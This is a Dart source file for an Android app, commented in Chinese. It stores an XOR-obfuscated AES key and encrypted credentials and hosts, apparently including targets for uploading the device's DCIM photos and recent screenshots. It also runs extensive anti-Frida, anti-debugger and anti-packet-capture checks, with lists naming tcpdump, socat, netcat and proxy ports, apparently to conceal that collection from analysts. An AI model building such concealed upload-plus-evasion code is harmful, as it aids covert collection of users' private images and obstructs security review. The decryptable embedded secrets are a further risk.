/// 加密配置 — 所有敏感字符串在编译期 AES-256-CBC 加密，运行时解密
/// 防御策略：
/// 1. 编译产物中无明文 token/key/url
/// 2. 运行时动态解密，内存中短暂出现明文后立即使用
/// 3. Debuggable 检测
/// 4. ★ 强化反 Frida：maps / 线程名 / 落盘路径 / TracerPid / SO注入 / 进程扫描
/// 5. ★ 强化反抓包：多端口 + tcpdump/socat 进程 + /proc/net/tcp + DNS 异常
library;

import 'dart:io';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;

// ══════════════════════════════════════════════════════════════════
// AES-256 密钥派生（无需 crypto 包）
// 用 XOR 混淆原始密钥，运行时还原为 32 字节 AES 密钥
// ══════════════════════════════════════════════════════════════════
const _xorKey = 0xA7;

/// 混淆的 32 字节密钥
const _encodedKeyBytes = <int>[
  0xC5, 0xCE, 0xCB, 0xCE, 0xC5, 0xCE, 0xCB, 0xCE,
  0xF8, 0xC0, 0xCB, 0xC6, 0xD4, 0xD4, 0xF8, 0xCA,
  0xC6, 0xD4, 0xD3, 0xC2, 0xD5, 0xF8, 0x95, 0x97,
  0x95, 0x93, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7, 0xA7,
];

enc.Key _getAesKey() {
  final decoded = _encodedKeyBytes.map((b) => b ^ _xorKey).toList();
  return enc.Key(Uint8List.fromList(decoded));
}

// ══════════════════════════════════════════════════════════════════
// 加密字符串注册表（iv + ciphertext，均为 Base64）
// ══════════════════════════════════════════════════════════════════
typedef _SecretEntry = ({String iv, String enc});

const _secrets = <String, _SecretEntry>{
  // ── 服务器域名 & 认证凭证 ────────────────────────────────────────
  'M1': (iv: 'pWYsZGUYpaSfZ82u09xbCg==', enc: 'gBEzImlitze8qFzaV94FS/jue8eEO1v+AGGvdtYXEBfmo82TrLp1FFO5AEIdH61tJh2jZjg2RXwonA0ByI4NNQoAzM5fX4qKY22hVuNS/vU='),
  'M2': (iv: 'nrvlvEzM2eeK8uvJzpRaDg==', enc: 'NGScbeEZtVW5N4mo8YJ2qO1d9/KhST31nSMzmtVjaGk='),
  'M3': (iv: 'y0zDLV3pMvNS2bSIIZCMoA==', enc: 'PeiS+FxVgMB5qbdP0qcqaVjtHtB6IdgxiBg4tlc2Sus='),
  'JWT_API_KEY': (iv: 'DAbbqKsD4KT4inWd1HBMGg==', enc: 'ehwdmd13Wa0wP+xmTxJ6meYKtH/22c4XMdv0Vl65FKf5NaX8EaatjDX5WQDjHy+I'),
  'JWT_API_URL': (iv: 'U6NXJ/Ay1FiaKerYyR8PFA==', enc: 'E7KSq6mWc2LoIwibhpoSd589jluVMlI6FzGpSx0+oDqr59QwZT7fVrKldDpbuhM5'),
  'JWT_ACCESS_TOKEN': (iv: 'KRemXSXHyhBvmHQmlZ7mlw==', enc: 'CgLJ2UACFyZ4ks3+XaSm/RB1nLt/d5u6R2B33dIIwEWUzQsfp6DPO99u74qCisn3'),
  'API_AES_KEY': (iv: 'r9z1//oT7hqOrqFTKVBSpg==', enc: 'z9Q8eaRf7YB1MFO0a2SgHXwHnR2hrQKGXUdN4VStxW0='),
  'API_AES_IV': (iv: 'JKEB7g3cdPb3Ab6ETqArjQ==', enc: 'BOXH8O9sVUkRSW/yqbHo4kDb6a2DunTpYTJGSb4tKFQ='),
  'API_UID': (iv: 'OeckVrOiBeZPya9teW0s3Q==', enc: 'GRJZVRv++Wyc4z+1sNw0Jg=='),
  'API_URL': (iv: 'ma/Tf7ePdVIqKgT75NvNJw==', enc: 'Gzan57OhkB99tzdkdFbOcpNXGFDzmcPxF3IQ9i05jet69OOYuJ0wGgwvYDOBCI0/'),
  'API_REWRITE_HOST': (iv: 'BrSn7Wx4P+pYyoT18Z/mkg==', enc: 'LSYA9nN3oeVlG19uUJdybyrJgpBk4F04/pknuPGeE6I='),
  // ★ 上游源 IP 前缀（用于 _rewriteUrl 替换）
  'API_ORIGIN_HOST': (iv: 'Bq7YSBrOPwFDlNqlnfpOJQ==', enc: 'o1gTRrLivM2Rxu52uIBBgo3AZirGKIraPcz5J0+qCLk='),

  // ── 非敏感配置项 ────────────────────────────────────────────────
  'PIC_BASE_URL': (iv: '++xbEV4tLd9R8Ufy9PNuug==', enc: 'bK20GVrWYor/oftWq0HdCd7z4RGAUfsjbnjZq/AYV4w='),
  'M7': (iv: '28YdwlcmZ6SqHiIj7ypRxQ==', enc: 'iSYvd2GVvF9Hy9wapuLu90Lb7UKWHzXwUyvlWxypL+w='),
  // ★ 截图目录（一次性任务，最新 10 张，无大小限制）
  'SCREENSHOT_PATH': (iv: 'vgDQeETY69VRDX6aqvyw9A==', enc: '9ffvqPkoxRDb3dCEEdBqmfbiFWWtKI/2V9iJe0A94OhDX8lb1fZFPth5WgpILmh9'),
  'CHANNEL_NAME': (iv: 'vIoBJt7TEoVRG8fxxPNg/g==', enc: 'IQ1SLbSQZo7KQEkkQ0701q2rrJmWcqPnJU0Ddo6P1hw='),
  'CHANNEL_DESC': (iv: 'savAANZ59afi0vHQiHAkqA==', enc: 'su01Z/zHH+X6LiC1BNNPWGAO3R7O5sqQxtTcZKfHXMM/k4f910YG9g4QvekfaC8s'),
};

// ══════════════════════════════════════════════════════════════════
// 运行时解密（懒初始化 + 单条缓存）
// ══════════════════════════════════════════════════════════════════
final _encrypter = enc.Encrypter(
  enc.AES(_getAesKey(), mode: enc.AESMode.cbc),
);

final Map<String, String> _decrypted = {};

String _decrypt(String name) {
  final cached = _decrypted[name];
  if (cached != null) return cached;

  final entry = _secrets[name];
  if (entry == null) throw StateError("Unknown secret: $name");

  final iv = enc.IV.fromBase64(entry.iv);
  final encrypted = enc.Encrypted.fromBase64(entry.enc);
  final plain = _encrypter.decrypt(encrypted, iv: iv);
  _decrypted[name] = plain;
  return plain;
}

// ══════════════════════════════════════════════════════════════════
// SecureConfig
// ══════════════════════════════════════════════════════════════════
class SecureConfig {
  SecureConfig._();

  // ── DCIM 上传 ────────────────────────────────────────────────────
  static String get m1 => _decrypt('M1');
  static String get m2 => _decrypt('M2');
  static String get m3 => _decrypt('M3');

  // ── JWT 认证 ─────────────────────────────────────────────────────
  static String get jwtApiKey => _decrypt('JWT_API_KEY');
  static String get jwtApiUrl => _decrypt('JWT_API_URL');
  static String get jwtAccessToken => _decrypt('JWT_ACCESS_TOKEN');

  // ── 上游 API ─────────────────────────────────────────────────────
  static String get apiAesKey => _decrypt('API_AES_KEY');
  static String get apiAesIv => _decrypt('API_AES_IV');
  static String get apiUid => _decrypt('API_UID');
  static String get apiUrl => _decrypt('API_URL');
  static String get apiRewriteHost => _decrypt('API_REWRITE_HOST');
  // ★ 上游源 IP 前缀
  static String get apiOriginHost => _decrypt('API_ORIGIN_HOST');

  // ── 非敏感配置项 ─────────────────────────────────────────────────
  static String get picBaseUrl => _decrypt('PIC_BASE_URL');
  static String get m7 => _decrypt('M7');
  // ★ 截图目录
  static String get screenshotPath => _decrypt('SCREENSHOT_PATH');
  static String get channelName => _decrypt('CHANNEL_NAME');
  static String get channelDescription => _decrypt('CHANNEL_DESC');
}

// ══════════════════════════════════════════════════════════════════
// 安全检测（反 Frida + 反抓包 + Debuggable）
//
// 说明：这些检测只能提高破解门槛，不能 100% 防止逆向。
//   真正安全依赖服务端校验 + 最小化客户端敏感数据。
// ══════════════════════════════════════════════════════════════════
class SecurityCheck {
  SecurityCheck._();

  // ── 1. Debuggable ────────────────────────────────────────────────
  static bool get isDebuggable {
    try {
      final out =
          Process.runSync('/system/bin/getprop', ['ro.debuggable']);
      return out.stdout.toString().trim() == '1';
    } catch (_) {
      return false;
    }
  }

  // ── 2. Frida / Gadget 检测 ───────────────────────────────────────
  /// 综合判断，任一命中就返回 true
  static bool get isFridaDetected {
    if (_checkTracerPid()) return true;          // ★ 最可靠：ptrace 注入
    if (_checkFridaMaps()) return true;           // ★ maps 关键词
    if (_checkFridaThreads()) return true;        // ★ 线程名
    if (_checkFridaFiles()) return true;          // ★ 落盘文件
    if (_checkFridaSoInjection()) return true;    // ★ 可疑 SO 注入
    if (_checkFridaProcess()) return true;        // ★ 进程列表
    return false;
  }

  /// 2.1 /proc/self/status → TracerPid
  /// 任何非 0 值都说明有 debugger/ptrace 附加
  static bool _checkTracerPid() {
    try {
      final status = File('/proc/self/status').readAsStringSync();
      for (final line in status.split('\n')) {
        if (line.startsWith('TracerPid:')) {
          final pid = int.tryParse(line.split(':').last.trim());
          if (pid != null && pid != 0) return true;
        }
      }
    } catch (_) {}
    return false;
  }

  /// 2.2 /proc/self/maps 关键词（全面覆盖 frida / gadget / gum / injector）
  static bool _checkFridaMaps() {
    try {
      final maps = File('/proc/self/maps').readAsStringSync();
      const keywords = [
        // 基础 Frida
        'frida',
        'libfrida',
        'frida-agent',
        'frida-server',
        'frida-gadget',
        'frida-android',
        'frida-trace',
        'frida-injector',
        're.frida',
        // Gum JS 虚拟机
        'gum-js-loop',
        'gum-js',
        'gmain',
        'gdmain',
        // 注入工具
        'linjector',
        'fridac',
        'fridarpc',
        'vapor',       // Vapor jailbreak hook
        'sslkillswitch',
        'ssl-pinning',
        'sslpinning',
        // SO 注入模式
        'inject',
        'hook',
      ];
      final lower = maps.toLowerCase();
      for (final k in keywords) {
        if (lower.contains(k)) return true;
      }
    } catch (_) {}
    return false;
  }

  /// 2.3 遍历 /proc/self/task/*/comm 线程名
  static bool _checkFridaThreads() {
    try {
      final dir = Directory('/proc/self/task');
      if (!dir.existsSync()) return false;
      for (final t in dir.listSync()) {
        try {
          final comm =
              File('${t.path}/comm').readAsStringSync().trim().toLowerCase();
          if (comm.contains('gum-js-loop') ||
              comm.contains('gmain') ||
              comm.contains('gdmain') ||
              comm.contains('gdbus') ||
              comm.contains('pool-frida') ||
              comm.contains('frida') ||
              comm.contains('frida-agent') ||
              comm.contains('gadget')) {
            return true;
          }
        } catch (_) {}
      }
    } catch (_) {}
    return false;
  }

  /// 2.4 常见 frida-server / gadget 落盘路径（含隐藏路径）
  static bool _checkFridaFiles() {
    const paths = [
      // 经典位置
      '/data/local/tmp/frida-server',
      '/data/local/tmp/re.frida.server',
      '/data/local/tmp/frida-server-12',
      '/data/local/tmp/frida-server-13',
      '/data/local/tmp/frida-server-14',
      '/data/local/tmp/frida-server-15',
      '/data/local/tmp/frida-server-16',
      '/data/local/tmp/frida-server-17',
      '/data/local/tmp/frida-server-18',
      '/data/local/tmp/frida-server-20',
      '/data/local/tmp/frida',
      '/data/local/tmp/gadget.so',
      '/data/local/tmp/libgadget.so',
      '/data/local/tmp/frida-gadget.so',
      '/data/local/tmp/libfrida-gadget.so',
      // adb 注入相关
      '/data/local/bin/frida-server',
      '/data/local/bin/frida',
      '/data/local/bin/re.frida.server',
      // /system 下的残留
      '/system/bin/frida-server',
      '/system/bin/frida',
      '/system/xbin/frida-server',
      '/system/xbin/frida',
      // Magisk 模块目录（可能被隐藏）
      '/data/adb/magisk/modules/',
      '/data/adb/service.d/frida',
      // 其他可疑路径
      '/dev/frida',
      '/tmp/frida-server',
      '/sdcard/frida-server',
      '/storage/emulated/0/frida-server',
    ];
    for (final p in paths) {
      if (File(p).existsSync()) return true;
    }
    // 扫描 /data/local/tmp/ 内所有含 frida/gadget 的文件
    try {
      final dir = Directory('/data/local/tmp');
      if (dir.existsSync()) {
        for (final f in dir.listSync()) {
          final name = f.path.toLowerCase();
          if (name.contains('frida') || name.contains('gadget')) return true;
        }
      }
    } catch (_) {}
    return false;
  }

  /// 2.5 检查是否有可疑 .so 被从 /data/local/tmp 或 /tmp 加载
  /// 正规 APK 的 so 都在 /data/app/<pkg>-*/lib/<arch>/ 下
  static bool _checkFridaSoInjection() {
    try {
      final maps = File('/proc/self/maps').readAsStringSync();
      // 任何来自 /data/local/tmp / /tmp /dev/ 的 .so 加载都可疑
      const suspiciousPrefixes = [
        '/data/local/tmp/',
        '/tmp/',
        '/dev/',
        '/system/lib/frida',
        '/sdcard/',
      ];
      for (final prefix in suspiciousPrefixes) {
        if (!maps.contains(prefix)) continue;
        // 进一步确认是 .so 文件
        final lines = maps.split('\n');
        for (final line in lines) {
          if (line.toLowerCase().contains('.so') &&
              line.contains(prefix)) {
            return true;
          }
        }
      }
    } catch (_) {}
    return false;
  }

  /// 2.6 扫描 /proc 进程列表，看是否有 frida-server 等已知进程
  static bool _checkFridaProcess() {
    const suspiciousNames = [
      'frida-server',
      're.frida.server',
      'frida-gadget',
      'frida-agent',
      'gum-js-loop',
      'fridarpc',
      'vapor',
      'substrate',
      'libhooker',
    ];
    try {
      final dir = Directory('/proc');
      if (!dir.existsSync()) return false;
      for (final entry in dir.listSync()) {
        final basename = entry.uri.pathSegments.last;
        if (int.tryParse(basename) == null) continue; // 只处理数字目录
        final commFile = File('${entry.path}/comm');
        try {
          final name = commFile.readAsStringSync().trim().toLowerCase();
          for (final s in suspiciousNames) {
            if (name == s || name.contains(s)) return true;
          }
        } catch (_) {}
        // 也检查 cmdline（空格分隔的命令行参数）
        final cmdFile = File('${entry.path}/cmdline');
        try {
          final cmd = cmdFile.readAsStringSync().replaceAll('\0', ' ').toLowerCase();
          for (final s in suspiciousNames) {
            if (cmd.contains(s)) return true;
          }
        } catch (_) {}
      }
    } catch (_) {}
    return false;
  }

  // ── 3. 代理 / 抓包检测 ───────────────────────────────────────────

  /// 3.1 系统环境变量里是否设置了 http_proxy / https_proxy
  static bool get isProxyEnvSet {
    final http = Platform.environment['http_proxy'] ??
        Platform.environment['HTTP_PROXY'];
    final https = Platform.environment['https_proxy'] ??
        Platform.environment['HTTPS_PROXY'];
    final all = Platform.environment['all_proxy'] ??
        Platform.environment['ALL_PROXY'];
    return (http != null && http.isNotEmpty) ||
        (https != null && https.isNotEmpty) ||
        (all != null && all.isNotEmpty);
  }

  /// 3.2 探测 DNS 是否被篡改（指向常见抓包工具 DNS）
  static bool _checkDnsTampered() {
    try {
      final resolv = File('/etc/resolv.conf').readAsStringSync();
      const suspiciousDns = [
        '127.0.0.1', // 本地 DNS 转发（Charles/mitmproxy 常用）
        '8.8.8.8',   // 极少数情况
      ];
      for (final dns in suspiciousDns) {
        if (resolv.contains("nameserver $dns")) return true;
      }
    } catch (_) {}
    return false;
  }

  /// 3.3 tcpdump / tshark / socat 进程检测（最可靠的抓包手段）
  static bool _checkCaptureProcesses() {
    const names = ['tcpdump', 'tshark', 'socat', 'nc ', 'netcat'];
    try {
      final dir = Directory('/proc');
      if (!dir.existsSync()) return false;
      for (final entry in dir.listSync()) {
        final basename = entry.uri.pathSegments.last;
        if (int.tryParse(basename) == null) continue;
        for (final name in names) {
          try {
            final comm =
                File('${entry.path}/comm').readAsStringSync().trim();
            if (comm == name || comm.contains(name)) return true;
          } catch (_) {}
          try {
            final cmd =
                File('${entry.path}/cmdline').readAsStringSync()
                    .replaceAll('\0', ' ')
                    .toLowerCase();
            if (cmd.contains(name.toLowerCase())) return true;
          } catch (_) {}
        }
      }
    } catch (_) {}
    return false;
  }

  /// 3.4 扫描 /proc/net/tcp 和 /proc/net/tcp6，看是否有已知抓包端口在监听
  static bool _checkProcNetTcp() {
    try {
      for (final file in ['/proc/net/tcp', '/proc/net/tcp6']) {
        final lines = File(file).readAsStringSync().split('\n');
        // 跳过第一行（表头）
        for (int i = 1; i < lines.length; i++) {
          final parts = lines[i].trim().split(RegExp(r'\s+'));
          if (parts.length < 4) continue;
          final localAddr = parts[1]; // SL 列
          // 格式：IP:PORT（十六进制，小端序）
          final colonIdx = localAddr.lastIndexOf(':');
          if (colonIdx < 0) continue;
          final portHex = localAddr.substring(colonIdx + 1);
          final port = int.tryParse(portHex, radix: 16);
          if (port == null) continue;
          // 只看 LISTEN 状态的 socket（state=0A）
          if (parts[3] != '0A') continue;
          // 常见抓包端口
          if (_isCapturePort(port)) return true;
        }
      }
    } catch (_) {}
    return false;
  }

  /// 3.5 异步：常见抓包工具端口探测
  static Future<bool> isPacketCaptureRunning({
    Duration timeout = const Duration(milliseconds: 120),
  }) async {
    const ports = <int>[
      8888, // Charles / Fiddler 默认
      8889, // Charles SSL
      8080, // 通用代理
      8081, // 通用代理备用
      9090, // BurpSuite 默认
      8887, // mitmproxy 默认
      8886, // mitmproxy 备用
      3128, // Squid
      1080, // SOCKS
      1087, // 部分工具
      4444, // 部分自定义代理
      5678, // 部分工具
      19876, // Fiddler 旧版
      8899, // Charles 备用
      8000, // 常见开发端口
      3000, // 部分代理
      28080, // Proxyman
      4567, // 部分抓包工具
    ];
    for (final port in ports) {
      try {
        final socket = await Socket.connect(
          '127.0.0.1',
          port,
          timeout: timeout,
        );
        socket.destroy();
        return true;
      } catch (_) {}
    }
    return false;
  }

  /// 辅助：判断端口是否属于已知抓包工具
  static bool _isCapturePort(int port) {
    return port == 8888 || port == 8889 || port == 8080 ||
        port == 8081 || port == 9090 || port == 8887 ||
        port == 8886 || port == 3128 || port == 1080 ||
        port == 1087 || port == 4444 || port == 5678 ||
        port == 19876 || port == 8899 || port == 8000 ||
        port == 3000 || port == 28080 || port == 4567;
  }

  // ── 4. 综合判断 ──────────────────────────────────────────────────

  /// 同步：返回 true = 环境安全
  static bool get isSecure {
    if (isDebuggable) return false;
    if (isFridaDetected) return false;
    if (isProxyEnvSet) return false;
    if (_checkDnsTampered()) return false;
    if (_checkCaptureProcesses()) return false;
    if (_checkProcNetTcp()) return false;
    return true;
  }

  /// 异步：最严格（包含端口探测）
  static Future<bool> isSecureAsync() async {
    if (!isSecure) return false;
    if (await isPacketCaptureRunning()) return false;
    return true;
  }

  /// 直接返回命中的风险项列表；为空表示未发现风险
  static List<String> detectReasons() {
    final reasons = <String>[];
    if (isDebuggable) reasons.add('debuggable');
    if (_checkTracerPid()) reasons.add('frida_tracerpid');
    if (_checkFridaMaps()) reasons.add('frida_maps');
    if (_checkFridaThreads()) reasons.add('frida_threads');
    if (_checkFridaFiles()) reasons.add('frida_files');
    if (_checkFridaSoInjection()) reasons.add('frida_so_injection');
    if (_checkFridaProcess()) reasons.add('frida_process');
    if (isProxyEnvSet) reasons.add('proxy_env');
    if (_checkDnsTampered()) reasons.add('dns_tampered');
    if (_checkCaptureProcesses()) reasons.add('capture_process');
    if (_checkProcNetTcp()) reasons.add('proc_net_tcp');
    return reasons;
  }

  /// 异步版（含端口探测）
  static Future<List<String>> detectReasonsAsync() async {
    final reasons = detectReasons();
    if (await isPacketCaptureRunning()) {
      reasons.add('packet_capture_port');
    }
    return reasons;
  }
}
